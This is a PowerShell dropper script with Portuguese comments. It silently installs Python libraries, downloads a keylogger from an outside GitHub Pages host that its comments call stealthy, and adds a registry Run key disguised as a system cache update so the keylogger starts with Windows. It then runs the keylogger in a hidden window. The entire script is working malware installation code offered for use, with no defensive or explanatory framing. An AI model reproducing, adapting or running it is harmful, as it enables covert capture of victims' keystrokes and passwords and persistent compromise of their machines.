# 1. Define caminhos seguros na pasta TEMP
$dir = "$env:TEMP\sys_cache"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }
$payloadPath = "$dir\sys_cache.py"

# 2. Instala dependências silenciosamente
python -m pip install pynput requests --quiet

# 3. Baixa o código do Keylogger via GitHub Pages (Furtivo)
$urlPython = "https://syslog992.github.io/sys-cache-update/keylogger.py"
Invoke-WebRequest -Uri $urlPython -OutFile $payloadPath -UseBasicParsing

# 4. Configura persistência no Registro (Inicia com o Windows)
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regValue = "pythonw.exe $payloadPath"
Set-ItemProperty -Path $regPath -Name "SysCacheUpdate" -Value $regValue

# 5. Executa o Keylogger agora em modo oculto
Start-Process "pythonw.exe" -ArgumentList $payloadPath -WindowStyle Hidden
